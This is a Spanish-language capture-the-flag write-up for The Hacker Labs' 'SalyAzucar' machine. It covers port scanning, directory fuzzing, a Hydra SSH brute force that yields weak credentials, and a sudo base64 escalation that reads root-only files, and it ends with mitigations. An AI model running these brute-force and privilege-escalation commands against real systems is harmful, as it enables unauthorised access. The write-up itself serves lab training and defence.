# Write-Up – SalyAzucar | The Hacker Labs

## Información General

| Campo | Detalle |
|---|---|
| **Máquina** | SalyAzucar |
| **Plataforma** | The Hacker Labs |
| **Dificultad** | Beginner |
| **SO Víctima** | Linux (Debian) |
| **IP Víctima** | 10.0.50.6 |
| **IP Atacante** | 10.0.50.3 (Kali Linux) |
| **Objetivo** | user.flag + root.flag |

---

## Cadena de Ataque

```
Enumeración Web → Comentario HTML → Directorio /summary → Credenciales débiles → SSH → sudo base64 → root
```

---

## 1. Reconocimiento

Escaneo inicial de puertos:

```bash
nmap -sC -sV -p- 10.0.50.6
```

Servicios detectados:

```
22/tcp  open  ssh     OpenSSH (Debian)
80/tcp  open  http    Apache 2.4.57 (Debian)
```

El puerto 80 mostraba la página por defecto de Apache.

---

## 2. Enumeración Web

### Análisis del código fuente

Durante la inspección del código fuente de la página principal se identificó un comentario HTML con referencias a secciones internas:

```html
<!-- about, changes, scope, files -->
```

Esto sugería el uso de una plantilla con posibles rutas o recursos internos.

### Fuzzing de directorios

```bash
gobuster dir -u http://10.0.50.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Resultado relevante:

```
/summary  (301)
```

La ruta `/summary/` tenía el **listado de directorios habilitado**, revelando:

```
summary.html
```

### Contenido de summary.html

```
"Cambia la contraseña"
```

Pista clara de credenciales débiles en el sistema.

---

## 3. Acceso Inicial – Fuerza Bruta SSH

Confirmado que SSH permitía autenticación por contraseña, se procedió a fuerza bruta controlada:

```bash
hydra -l info -P /usr/share/wordlists/xato-net-10-million-passwords.txt ssh://10.0.50.6 -t 4 -vV
```

Credenciales encontradas:

```
Usuario:    info
Contraseña: qwerty
```

Acceso al sistema:

```bash
ssh info@10.0.50.6
```

---

## 4. Post-Explotación

### Estabilización de la shell

```bash
script /dev/null -c bash
export TERM=xterm
stty rows 40 columns 120
```

### Enumeración de privilegios sudo

```bash
sudo -l
```

Resultado:

```
(root) NOPASSWD: /usr/bin/base64
```

El usuario `info` puede ejecutar `base64` como root **sin contraseña**.

---

## 5. Escalada de Privilegios – Abuso de sudo base64

`base64` permite leer archivos del sistema. Según [GTFOBins](https://gtfobins.github.io/gtfobins/base64/):

```bash
sudo /usr/bin/base64 /root/root.txt | base64 -d
```

Esto permite:
- Leer `/root/root.txt` con permisos de root
- Decodificar el contenido en base64
- Obtener el **root flag**

✅ **Sistema comprometido como root.**

---

## 6. Vulnerabilidades Identificadas

| Vulnerabilidad | Descripción |
|---|---|
| Directorio web expuesto | `/summary/` con directory listing habilitado |
| Credenciales débiles | `info:qwerty` — contraseña trivial |
| Mala configuración sudo | `base64` ejecutable como root permite leer cualquier archivo |

---

## 7. Mitigaciones Recomendadas

- Deshabilitar el directory listing en Apache (`Options -Indexes`)
- Forzar política de contraseñas seguras
- Revisar y restringir las entradas en `/etc/sudoers`
- Aplicar principio de mínimo privilegio

---

## 8. Lecciones Aprendidas

- Siempre revisar el **código fuente** de la página — los comentarios HTML pueden revelar rutas ocultas.
- Un mensaje como "Cambia la contraseña" es una pista directa de credenciales débiles.
- `sudo -l` debe ser uno de los primeros comandos tras obtener acceso.
- Consultar **GTFOBins** para cualquier binario con permisos sudo inusuales.

---

*Write-up educativo – The Hacker Labs | Autor: Pablo Romo González*
